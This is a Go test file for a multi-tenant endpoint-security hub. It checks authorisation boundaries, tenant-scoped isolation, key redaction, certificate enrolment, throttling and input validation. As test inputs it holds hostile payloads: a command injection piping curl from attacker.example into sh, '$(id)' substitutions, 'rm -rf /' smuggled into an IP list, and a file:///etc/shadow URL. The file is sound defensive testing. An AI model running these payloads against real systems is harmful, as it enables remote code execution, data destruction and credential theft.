package server

import (
	"bytes"
	"encoding/json"
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"ominull/hub/pkg/copilot"
	"ominull/hub/pkg/storage"
)

// call runs a request through the real middleware chain, so what these tests
// exercise is the route as it is wired, not the handler in isolation.
func call(srv *Server, handler http.HandlerFunc, method, target, apiKey, body string) *httptest.ResponseRecorder {
	var r *http.Request
	if body == "" {
		r = httptest.NewRequest(method, target, nil)
	} else {
		r = httptest.NewRequest(method, target, bytes.NewBufferString(body))
	}
	if apiKey != "" {
		r.Header.Set("X-API-Key", apiKey)
	}
	w := httptest.NewRecorder()
	srv.authMiddleware(handler)(w, r)
	return w
}

// TestTenantKeyCannotReachOperatorRoutes is the boundary the whole deployment
// leans on. The tenant key is installed on every endpoint in the fleet, so any
// route it can reach is a route one compromised host can reach - and these are
// the routes that act on the whole fleet or hand back other people's
// credentials.
func TestTenantKeyCannotReachOperatorRoutes(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	for _, tc := range []struct {
		name    string
		method  string
		target  string
		body    string
		handler http.HandlerFunc
	}{
		{"list tenants and their keys", "GET", "/api/v1/tenants", "", srv.handleTenants},
		{"create a tenant with a chosen key", "POST", "/api/v1/tenants", `{"id":"evil","api_key":"attacker-chosen"}`, srv.handleTenants},
		{"quarantine a peer fleet-wide", "POST", "/api/v1/mesh/quarantine", `{"target_ip":"10.0.0.9"}`, srv.handleMeshQuarantine},
		{"release a quarantined peer", "POST", "/api/v1/mesh/unquarantine", `{"target_ip":"10.0.0.9"}`, srv.handleMeshUnquarantine},
		{"push a deploy to any address", "POST", "/api/v1/deployer/push", `{"target_ip":"10.0.0.9","username":"root","password":"x"}`, srv.handleDeployerPush},
		{"read deploy job output", "GET", "/api/v1/deployer/jobs", "", srv.handleDeployerJobs},
		{"sweep an arbitrary subnet", "POST", "/api/v1/scanner/scan", `{"subnet":"10.0.0.0/24"}`, srv.handleScannerScan},
		{"read the discovered inventory", "GET", "/api/v1/scanner/results", "", srv.handleScannerResults},
		{"repoint the copilot backend", "POST", "/api/v1/copilot/config", `{"provider":"ollama","ollama_url":"http://attacker.example/"}`, srv.handleCopilotConfig},
		{"read the copilot configuration", "GET", "/api/v1/copilot/config", "", srv.handleCopilotConfig},
		{"read the whole topology", "GET", "/api/v1/topology/graph", "", srv.handleTopologyGraph},
		{"correct an asset claim", "POST", "/api/v1/assets/correct", `{"ip":"10.0.0.9","field":"device","value":"x"}`, srv.handleAssetCorrect},
		{"read fleet update currency", "GET", "/api/v1/agents/update-status", "", srv.handleAgentsUpdateStatus},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w := call(srv, requireAdmin(tc.handler), tc.method, tc.target, "mock_tenant_token", tc.body)
			if w.Code != http.StatusForbidden {
				t.Errorf("tenant key reached %s %s: got %d, want 403\n%s", tc.method, tc.target, w.Code, w.Body.String())
			}

			// The same call with the admin credential must still work, or the
			// fix has only broken the console.
			w = call(srv, requireAdmin(tc.handler), tc.method, tc.target, "mock_admin_token", tc.body)
			if w.Code == http.StatusForbidden || w.Code == http.StatusUnauthorized {
				t.Errorf("admin key was refused on %s %s: got %d\n%s", tc.method, tc.target, w.Code, w.Body.String())
			}
		})
	}
}

// TestIsolationIsScopedToTheOwningTenant covers the sharpest control the hub
// has. Both routes took an endpoint id out of a request body and acted on it
// without asking whose endpoint it was, so a tenant could cut any host in any
// other tenant off the network - or put a quarantined one back on it.
func TestIsolationIsScopedToTheOwningTenant(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	if err := store.CreateTenant(storage.Tenant{ID: "t-02", Name: "Other", APIKey: "other_tenant_token", CreatedAt: time.Now().UTC()}); err != nil {
		t.Fatalf("CreateTenant: %v", err)
	}
	if err := store.UpsertEndpoint(storage.Endpoint{
		ID: "linux-victim", TenantID: "t-02", Hostname: "victim", Status: "online",
		LastSeenAt: time.Now().UTC(), CreatedAt: time.Now().UTC(),
	}); err != nil {
		t.Fatalf("UpsertEndpoint: %v", err)
	}

	body := `{"endpoint_id":"linux-victim"}`
	for _, tc := range []struct {
		name    string
		handler http.HandlerFunc
	}{
		{"isolate", srv.handleIsolate},
		{"unisolate", srv.handleUnisolate},
	} {
		t.Run(tc.name+" across tenants is refused", func(t *testing.T) {
			w := call(srv, tc.handler, "POST", "/api/v1/endpoints/"+tc.name, "mock_tenant_token", body)
			if w.Code != http.StatusNotFound {
				t.Errorf("tenant t-01 %sd an endpoint owned by t-02: got %d, want 404\n%s", tc.name, w.Code, w.Body.String())
			}
		})
		t.Run(tc.name+" by the owning tenant is allowed", func(t *testing.T) {
			w := call(srv, tc.handler, "POST", "/api/v1/endpoints/"+tc.name, "other_tenant_token", body)
			if w.Code != http.StatusOK {
				t.Errorf("owning tenant could not %s its own endpoint: got %d\n%s", tc.name, w.Code, w.Body.String())
			}
		})
	}

	// An endpoint id with a quote in it used to be concatenated straight into
	// the response body.
	w := call(srv, srv.handleIsolate, "POST", "/api/v1/endpoints/isolate", "mock_admin_token", `{"endpoint_id":"a\"b"}`)
	if w.Code == http.StatusOK {
		var parsed map[string]string
		if err := json.Unmarshal(w.Body.Bytes(), &parsed); err != nil {
			t.Errorf("isolate response is not valid JSON for an id containing a quote: %v (%s)", err, w.Body.String())
		}
	}
}

// TestMeshQuarantineRejectsAnythingButAnAddress is the hub half of the fleet
// command-injection fix. The value stored here is broadcast to every agent and
// reaches a privileged firewall command on each one.
func TestMeshQuarantineRejectsAnythingButAnAddress(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	for _, payload := range []string{
		`10.0.0.9 -j ACCEPT; curl http://attacker.example/x | sh`,
		"10.0.0.9$(id)",
		"10.0.0.9`id`",
		"not-an-ip",
		"10.0.0.9\nDROP",
	} {
		body, _ := json.Marshal(map[string]string{"target_ip": payload})
		w := call(srv, requireAdmin(srv.handleMeshQuarantine), "POST", "/api/v1/mesh/quarantine", "mock_admin_token", string(body))
		if w.Code != http.StatusBadRequest {
			t.Errorf("hub accepted %q as a quarantine target: got %d\n%s", payload, w.Code, w.Body.String())
		}
	}

	// A real address still works, and comes back normalised.
	w := call(srv, requireAdmin(srv.handleMeshQuarantine), "POST", "/api/v1/mesh/quarantine", "mock_admin_token", `{"target_ip":"10.0.0.9","target_mac":"aa:bb:cc:dd:ee:ff"}`)
	if w.Code != http.StatusOK {
		t.Fatalf("a valid quarantine was refused: %d\n%s", w.Code, w.Body.String())
	}
	peers, err := store.GetQuarantinedPeers()
	if err != nil || len(peers) != 1 || peers[0].TargetIP != "10.0.0.9" {
		t.Fatalf("expected exactly one quarantined peer 10.0.0.9, got %+v (%v)", peers, err)
	}
}

// TestScannerRefusesAnUnboundedSweep: the sweep materialises one string per
// address before probing anything, so the prefix in a request body decides how
// much memory the hub is asked for.
func TestScannerRefusesAnUnboundedSweep(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	w := call(srv, requireAdmin(srv.handleScannerScan), "POST", "/api/v1/scanner/scan", "mock_admin_token", `{"subnet":"10.0.0.0/8"}`)
	if w.Code != http.StatusBadRequest {
		t.Errorf("hub accepted a /8 sweep: got %d\n%s", w.Code, w.Body.String())
	}
	w = call(srv, requireAdmin(srv.handleScannerScan), "POST", "/api/v1/scanner/scan", "mock_admin_token", `{"subnet":"10.0.0.0/24"}`)
	if w.Code != http.StatusOK {
		t.Errorf("hub refused an ordinary /24 sweep: got %d\n%s", w.Code, w.Body.String())
	}
}

// TestCopilotConfigDoesNotDiscloseProviderKeys: a provider key is a billable
// credential belonging to whoever pasted it in, and the route used to hand both
// of them back verbatim.
func TestCopilotConfigDoesNotDiscloseProviderKeys(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	set := `{"provider":"openai","openai_api_key":"sk-secret-value","gemini_api_key":"gem-secret-value"}`
	w := call(srv, requireAdmin(srv.handleCopilotConfig), "POST", "/api/v1/copilot/config", "mock_admin_token", set)
	if w.Code != http.StatusOK {
		t.Fatalf("configuring the copilot failed: %d\n%s", w.Code, w.Body.String())
	}
	if strings.Contains(w.Body.String(), "sk-secret-value") || strings.Contains(w.Body.String(), "gem-secret-value") {
		t.Errorf("the POST response echoed a provider key back:\n%s", w.Body.String())
	}

	w = call(srv, requireAdmin(srv.handleCopilotConfig), "GET", "/api/v1/copilot/config", "mock_admin_token", "")
	if strings.Contains(w.Body.String(), "sk-secret-value") || strings.Contains(w.Body.String(), "gem-secret-value") {
		t.Errorf("the configuration route disclosed a provider key:\n%s", w.Body.String())
	}

	// Reading the redacted form and writing it back must not erase the key.
	var redacted copilot.Config
	if err := json.Unmarshal(w.Body.Bytes(), &redacted); err != nil {
		t.Fatalf("config response is not a config: %v", err)
	}
	roundTrip, _ := json.Marshal(redacted)
	if w := call(srv, requireAdmin(srv.handleCopilotConfig), "POST", "/api/v1/copilot/config", "mock_admin_token", string(roundTrip)); w.Code != http.StatusOK {
		t.Fatalf("writing back the redacted config failed: %d\n%s", w.Code, w.Body.String())
	}
	if got := srv.copilot.GetConfig().OpenAIAPIKey; got != "sk-secret-value" {
		t.Errorf("a round-trip through the redacted form erased the stored key: %q", got)
	}

	// A backend the hub would dial has to be a URL.
	if w := call(srv, requireAdmin(srv.handleCopilotConfig), "POST", "/api/v1/copilot/config", "mock_admin_token", `{"provider":"ollama","ollama_url":"file:///etc/shadow"}`); w.Code != http.StatusBadRequest {
		t.Errorf("copilot accepted a file:// backend: got %d\n%s", w.Code, w.Body.String())
	}
}

// TestCertificateEnrolmentNeedsAuthorisation. The certificate is what the hub
// tells endpoints apart by; a route that mints one for any name on request
// makes the identity it proves worth nothing.
func TestCertificateEnrolmentNeedsAuthorisation(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	body := `{"endpoint_id":"linux-victim"}`

	// The shared tenant key is not authorisation: it is on every endpoint.
	w := call(srv, srv.handlePKIEnroll, "POST", "/api/v1/pki/enroll", "mock_tenant_token", body)
	if w.Code != http.StatusForbidden {
		t.Errorf("the tenant key minted a certificate for another endpoint: got %d\n%s", w.Code, w.Body.String())
	}

	// The admin credential is.
	w = call(srv, srv.handlePKIEnroll, "POST", "/api/v1/pki/enroll", "mock_admin_token", body)
	if w.Code != http.StatusOK {
		t.Fatalf("admin enrolment was refused: %d\n%s", w.Code, w.Body.String())
	}

	// So is a single-use token, exactly once, and only for the endpoint it
	// names.
	token, err := store.CreateEnrollmentToken("linux-victim", storage.EnrollmentTokenTTL)
	if err != nil {
		t.Fatalf("CreateEnrollmentToken: %v", err)
	}

	withToken := func(tok, endpointID string) *httptest.ResponseRecorder {
		r := httptest.NewRequest("POST", "/api/v1/pki/enroll", bytes.NewBufferString(fmt.Sprintf(`{"endpoint_id":%q}`, endpointID)))
		r.Header.Set("X-API-Key", "mock_tenant_token")
		r.Header.Set("X-Enrollment-Token", tok)
		w := httptest.NewRecorder()
		srv.authMiddleware(srv.handlePKIEnroll)(w, r)
		return w
	}

	if w := withToken(token, "linux-attacker"); w.Code != http.StatusForbidden {
		t.Errorf("a token issued for linux-victim minted a certificate for linux-attacker: got %d", w.Code)
	}
	if w := withToken(token, "linux-victim"); w.Code != http.StatusOK {
		t.Fatalf("a valid enrolment token was refused: %d\n%s", w.Code, w.Body.String())
	}
	if w := withToken(token, "linux-victim"); w.Code != http.StatusForbidden {
		t.Errorf("an enrolment token was accepted twice: got %d", w.Code)
	}
	if w := withToken("not-a-token", "linux-victim"); w.Code != http.StatusForbidden {
		t.Errorf("a token this hub never issued was accepted: got %d", w.Code)
	}
}

// TestFailedAuthenticationIsThrottled. The keys are long random strings, so
// this is not what stands between an attacker and the hub - but nothing about
// the route cost a caller anything to retry, and a lockout puts a guessing run
// in the log where it can be seen.
func TestFailedAuthenticationIsThrottled(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	blocked := false
	for i := 0; i < srv.throttle.limit+2; i++ {
		w := call(srv, func(http.ResponseWriter, *http.Request) {}, "GET", "/api/v1/endpoints", "wrong-key", "")
		if w.Code == http.StatusTooManyRequests {
			blocked = true
			break
		}
		if w.Code != http.StatusUnauthorized {
			t.Fatalf("attempt %d: got %d, want 401", i, w.Code)
		}
	}
	if !blocked {
		t.Errorf("%d wrong keys in a row from one address were never throttled", srv.throttle.limit+2)
	}

	// A valid credential from another address is unaffected.
	r := httptest.NewRequest("GET", "/api/v1/endpoints", nil)
	r.RemoteAddr = "10.9.9.9:5555"
	r.Header.Set("X-API-Key", "mock_admin_token")
	w := httptest.NewRecorder()
	srv.authMiddleware(func(http.ResponseWriter, *http.Request) {})(w, r)
	if w.Code == http.StatusTooManyRequests {
		t.Errorf("a lockout on one address blocked a different one")
	}
}

// TestWebsocketRefusesForeignOrigins. Agents send no Origin header and are
// unaffected; a page on another site is what this stops from opening the socket
// in an operator's browser.
func TestWebsocketRefusesForeignOrigins(t *testing.T) {
	for _, tc := range []struct {
		origin string
		want   bool
	}{
		{"", true},
		{"http://hub.example", true},
		{"https://hub.example", true},
		{"http://attacker.example", false},
		{"null", false},
	} {
		r := httptest.NewRequest("GET", "http://hub.example/ws", nil)
		r.Host = "hub.example"
		if tc.origin != "" {
			r.Header.Set("Origin", tc.origin)
		}
		if got := upgrader.CheckOrigin(r); got != tc.want {
			t.Errorf("origin %q: CheckOrigin returned %v, want %v", tc.origin, got, tc.want)
		}
	}
}

// TestRequiredClientCertsApplyToThePlainListener. Both listeners share one mux,
// and only the TLS one can refuse a missing certificate at the handshake. The
// setting has to mean the same thing on the other port or it means nothing.
func TestRequiredClientCertsApplyToThePlainListener(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()
	srv.SetTLS(TLSOptions{Listen: "127.0.0.1:0", ClientCerts: ClientCertsRequired})

	batch := `{"type":"telemetry","endpoint_id":"linux-victim","events":[]}`

	w := call(srv, srv.handleEvents, "POST", "/api/v1/events", "mock_tenant_token", batch)
	if w.Code != http.StatusForbidden {
		t.Errorf("a certificate-free endpoint reported over the plain listener while --client-certs required: got %d\n%s", w.Code, w.Body.String())
	}

	// An operator is not an endpoint claiming to be one.
	w = call(srv, srv.handleEvents, "POST", "/api/v1/events", "mock_admin_token", batch)
	if w.Code == http.StatusForbidden {
		t.Errorf("the admin credential was refused on the telemetry route: %s", w.Body.String())
	}

	// And with the fleet mid-migration, an endpoint without one still reports.
	srv.SetTLS(TLSOptions{Listen: "127.0.0.1:0", ClientCerts: ClientCertsOptional})
	w = call(srv, srv.handleEvents, "POST", "/api/v1/events", "mock_tenant_token", batch)
	if w.Code == http.StatusForbidden {
		t.Errorf("--client-certs optional refused an endpoint with no certificate: %s", w.Body.String())
	}
}

// TestConsoleGateDoesNotLeakTheKeyOnwards. The console is unlocked with the key
// in the query string, so a navigation out of that document would carry it in a
// Referer header without this.
func TestConsoleGateSetsSecurityHeaders(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	r := httptest.NewRequest("GET", "/?key=mock_admin_token", nil)
	w := httptest.NewRecorder()
	srv.handleDashboard(w, r)

	if w.Code != http.StatusOK {
		t.Fatalf("console did not render for the admin key: %d", w.Code)
	}
	for header, want := range map[string]string{
		"Referrer-Policy":        "no-referrer",
		"X-Content-Type-Options": "nosniff",
		"X-Frame-Options":        "DENY",
	} {
		if got := w.Header().Get(header); got != want {
			t.Errorf("%s: got %q, want %q", header, got, want)
		}
	}
	if w.Header().Get("Content-Security-Policy") == "" {
		t.Errorf("the console is served without a content security policy")
	}
}

// TestNoHandlerHoldsTheClientLockAcrossASendingCall is the server-side twin of
// the storage package's locking test, and it exists for the same reason.
//
// Five handlers broadcast a command by holding clientsMu.RLock and calling
// SendCommand inside the loop - and SendCommand takes clientsMu.RLock again. A
// Go RWMutex read lock is not reentrant: the moment a writer queues between the
// two acquisitions (any agent connecting or disconnecting), the inner RLock
// waits for the writer, the writer waits for the outer read lock to drop, and
// the hub's websocket registry stops for good. Snapshot under the lock and send
// outside it, which is what broadcastToTenant does.
func TestNoHandlerHoldsTheClientLockAcrossASendingCall(t *testing.T) {
	fset := token.NewFileSet()
	files, err := filepath.Glob("*.go")
	if err != nil {
		t.Fatalf("glob: %v", err)
	}

	// Methods that take clientsMu themselves. Calling one of these while
	// holding the same lock is the defect.
	takesLock := map[string]bool{}
	decls := map[string]*ast.FuncDecl{}

	for _, f := range files {
		if strings.HasSuffix(f, "_test.go") {
			continue
		}
		file, err := parser.ParseFile(fset, f, nil, 0)
		if err != nil {
			t.Fatalf("parse %s: %v", f, err)
		}
		for _, d := range file.Decls {
			fn, ok := d.(*ast.FuncDecl)
			if !ok || fn.Recv == nil || fn.Body == nil {
				continue
			}
			decls[fn.Name.Name] = fn
			ast.Inspect(fn.Body, func(n ast.Node) bool {
				sel, ok := n.(*ast.SelectorExpr)
				if !ok {
					return true
				}
				if sel.Sel.Name != "Lock" && sel.Sel.Name != "RLock" {
					return true
				}
				if inner, ok := sel.X.(*ast.SelectorExpr); ok && inner.Sel.Name == "clientsMu" {
					takesLock[fn.Name.Name] = true
				}
				return true
			})
		}
	}

	for name, fn := range decls {
		if !takesLock[name] {
			continue
		}
		// Everything between the acquisition and the matching release.
		var lockPos, unlockPos token.Pos
		ast.Inspect(fn.Body, func(n ast.Node) bool {
			call, ok := n.(*ast.CallExpr)
			if !ok {
				return true
			}
			sel, ok := call.Fun.(*ast.SelectorExpr)
			if !ok {
				return true
			}
			inner, ok := sel.X.(*ast.SelectorExpr)
			if !ok || inner.Sel.Name != "clientsMu" {
				return true
			}
			switch sel.Sel.Name {
			case "Lock", "RLock":
				if lockPos == token.NoPos {
					lockPos = call.Pos()
				}
			case "Unlock", "RUnlock":
				if unlockPos == token.NoPos && call.Pos() > lockPos {
					unlockPos = call.Pos()
				}
			}
			return true
		})
		if lockPos == token.NoPos {
			continue
		}
		ast.Inspect(fn.Body, func(n ast.Node) bool {
			call, ok := n.(*ast.CallExpr)
			if !ok || call.Pos() <= lockPos {
				return true
			}
			if unlockPos != token.NoPos && call.Pos() >= unlockPos {
				return true
			}
			sel, ok := call.Fun.(*ast.SelectorExpr)
			if !ok {
				return true
			}
			ident, ok := sel.X.(*ast.Ident)
			if !ok || ident.Name != "s" {
				return true
			}
			if !takesLock[sel.Sel.Name] || sel.Sel.Name == name {
				return true
			}
			t.Errorf("%s: %s holds clientsMu and calls s.%s, which takes it again - "+
				"sync.RWMutex is not reentrant; snapshot the registry and send outside the lock",
				fset.Position(call.Pos()), name, sel.Sel.Name)
			return true
		})
	}
}

// TestBulkIsolationIsScopedToTheOwningTenant. The bulk routes scoped the
// database write and then broadcast the command to every open socket, so one
// tenant isolating its own hosts cut off hosts it cannot even see.
func TestBulkIsolationIsScopedToTheOwningTenant(t *testing.T) {
	srv, store := setupTestServer(t)
	defer store.Close()

	if err := store.CreateTenant(storage.Tenant{ID: "t-02", Name: "Other", APIKey: "other_tenant_token", CreatedAt: time.Now().UTC()}); err != nil {
		t.Fatalf("CreateTenant: %v", err)
	}
	if err := store.UpsertEndpoint(storage.Endpoint{
		ID: "linux-victim", TenantID: "t-02", Hostname: "victim", Status: "online",
		LastSeenAt: time.Now().UTC(), CreatedAt: time.Now().UTC(),
	}); err != nil {
		t.Fatalf("UpsertEndpoint: %v", err)
	}

	// An explicit id list may not reach across the tenant boundary.
	w := call(srv, srv.handleBulkIsolate, "POST", "/api/v1/endpoints/isolate-bulk", "mock_tenant_token",
		`{"scope":"ids","ids":["linux-victim"]}`)
	if w.Code != http.StatusNotFound {
		t.Errorf("a tenant bulk-isolated another tenant's endpoint: got %d\n%s", w.Code, w.Body.String())
	}
	w = call(srv, srv.handleBulkUnisolate, "POST", "/api/v1/endpoints/unisolate-bulk", "mock_tenant_token",
		`{"scope":"ids","ids":["linux-victim"]}`)
	if w.Code != http.StatusNotFound {
		t.Errorf("a tenant bulk-released another tenant's endpoint: got %d\n%s", w.Code, w.Body.String())
	}

	// A fleet-wide broadcast reaches only the caller's own connected clients.
	srv.clientsMu.Lock()
	srv.clients["mine"] = &Client{EndpointID: "mine", TenantID: "t-01", Send: make(chan []byte, 1)}
	srv.clients["theirs"] = &Client{EndpointID: "theirs", TenantID: "t-02", Send: make(chan []byte, 1)}
	srv.clientsMu.Unlock()

	if got := srv.clientsInScope("t-01"); len(got) != 1 || got[0] != "mine" {
		t.Errorf("a t-01 broadcast targets %v; it must reach only that tenant's own endpoints", got)
	}
	if got := srv.clientsInScope("t-02"); len(got) != 1 || got[0] != "theirs" {
		t.Errorf("a t-02 broadcast targets %v", got)
	}
	// An operator's broadcast is the only one that reaches the whole hub.
	if got := srv.clientsInScope(""); len(got) != 2 {
		t.Errorf("an operator broadcast targets %v; it should reach every connected endpoint", got)
	}

	// An allow list is a firewall pinhole, so it has to be addresses.
	w = call(srv, srv.handleBulkIsolate, "POST", "/api/v1/endpoints/isolate-bulk", "mock_admin_token",
		`{"scope":"all","allow_ips":["10.0.0.1; rm -rf /"]}`)
	if w.Code != http.StatusBadRequest {
		t.Errorf("bulk isolate accepted a non-address in allow_ips: got %d\n%s", w.Code, w.Body.String())
	}
}
